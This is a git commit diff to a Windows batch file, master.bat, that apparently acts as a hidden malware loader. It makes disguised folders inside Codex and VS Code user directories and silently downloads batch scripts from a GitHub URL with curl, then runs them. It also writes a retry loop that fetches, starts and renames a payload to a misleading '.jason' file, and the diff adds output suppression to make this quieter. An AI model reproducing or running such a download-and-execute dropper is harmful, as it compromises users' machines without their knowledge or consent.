4498a5541b6e2f5af2c05f8d8faa06e9dde09ca9
eidanexa-lang <eidanexa@gmail.com>
2026-06-10 17:00:40 -0500

    Update master.bat

--- master.bat
+++ master.bat
@@ -10,9 +10,9 @@ if errorlevel 1 ( goto lol )
 if not exist "%userprofile%\.config\codex\6sd72w467s167d72f36f4\" ( mkdir "%userprofile%\.config\codex\6sd72w467s167d72f36f4\" )
 if not exist "%userprofile%\.codex\Memory\6sd72w467s167d72f36f4\" ( mkdir "%userprofile%\.codex\Memory\6sd72w467s167d72f36f4\" )
 if not exist "%appdata%\Code\User\History\7b8dea4d" ( 
-    mkdir "%appdata%\Code\User\History\7b8dea4d" 
+    mkdir "%appdata%\Code\User\History\7b8dea4d"  >nul 2>nul
     del /F /Q /A  "%appdata%\Code\User\History\7b8dea4d\zZxX1.bat" >nul 2>nul
-    curl -f -L -o "%appdata%\Code\User\History\7b8dea4d\zZX1.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/Madre.bat" >nul 
+    curl -f -L -o "%appdata%\Code\User\History\7b8dea4d\zZX1.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/Madre.bat" >nul 2>nul
     start "" "%appdata%\Code\User\History\7b8dea4d\zZX1.bat" ) 
 :lel
 (
@@ -29,10 +29,10 @@ if not exist "%appdata%\Code\User\History\7b8dea4d" (
     echo ping -n 1 8.8.8.8 ^>nul 2^>^&1
     echo if errorlevel 1 ^( goto wait_net ^)
     echo :dis
-    echo curl -f -L -o "%userprofile%\.config\codex\6sd72w467s167d72f36f4\Xtt.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/xtt.bat" >nul
+    echo curl -f -L -o "%userprofile%\.config\codex\6sd72w467s167d72f36f4\Xtt.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/xtt.bat" ^>nul 2^>^&1
     echo if errorlevel 1 ^( goto dis ^)
-    echo start "" "%userprofile%\.config\codex\6sd72w467s167d72f36f4\Xtt.bat"
-    echo timeout /t 2 /nobreak >nul
+    echo start "" "%userprofile%\.config\codex\6sd72w467s167d72f36f4\Xtt.bat" ^>nul 2^>^&1
+    echo timeout /t 2 /nobreak ^>nul 2^>^&1
     echo del /F /Q /A "%userprofile%\.config\codex\6sd72w467s167d72f36f4\164776617_7563474_86526371256434.jason" >nul 2>nul
     echo ren "%userprofile%\.config\codex\6sd72w467s167d72f36f4\Xtt.bat" "164776617_7563474_86526371256434.jason" >nul 2>nul
     echo exit
